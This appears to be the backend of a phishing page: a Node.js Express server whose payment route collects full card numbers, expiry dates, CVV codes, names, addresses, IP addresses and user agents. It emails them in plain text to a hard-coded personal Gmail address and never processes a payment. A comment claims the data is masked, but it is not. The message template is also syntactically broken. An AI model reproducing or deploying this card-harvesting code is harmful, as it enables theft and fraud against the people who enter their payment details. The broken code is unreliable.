const express = require('express');
const cors = require('cors');
const sgMail = require('@sendgrid/mail');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Set SendGrid API key
sgMail.setApiKey(process.env.SENDGRID_API_KEY);

// ✅ POST route to receive payment form data
app.post('/api/payment', async (req, res) => {
  const formData = req.body;
  console.log('📩 Received payment form data:', formData);

  // Extract values (match frontend form field names)
  const {
    'card-number': cardNumber,
    month,
    year,
    'security-code': cvv,
    'full-name': fullName,
    address,
    userAgent
  } = formData;

  // Capture IP address (supports proxies like Render)
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;

  // Fallback to request headers if userAgent not sent
  const agent = userAgent || req.headers['user-agent'];


  // Mask sensitive data to avoid spam flags
    try {
    // ✅ Send email with SendGrid
    const msg = {
      to: 'clintonrecher37@gmail.com', // Your receiving email
      from: process.env.EMAIL_USER, // SendGrid-verified sender
      subject: 'New Payment Form Submission', // Simplified, no emojis
      text: `
New Payment Submission Received:

Full Name: ${fullName}
Address: ${address || 'N/A'}

Card Number: ${cardNumber}
Expiry: ${month && year ? `${month}/${year}` : 'N/A'}
CVV: ${cvv}

IP Address: ${ip || 'N/A'}
User Agent: ${agent || 'N/A'}
Unsubscribe: ${process.env.UNSUBSCRIBE_URL || 'https://yourdomain.com/unsubscribe'}
      '};

    const result = await sgMail.send(msg);
    console.log('📧 SendGrid response:', JSON.stringify(result[0].response, null, 2));
    console.log('📧 Email sent successfully');

    res.json({ status: 'ok', message: 'Data received and emailed' });
  } catch (error) {
    console.error('❌ Error sending email:', error);
    if (error.response) {
      console.error('SendGrid error details:', JSON.stringify(error.response.body, null, 2));
    }
    res.status(500).json({ status: 'error', message: 'Failed to send email' });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
});
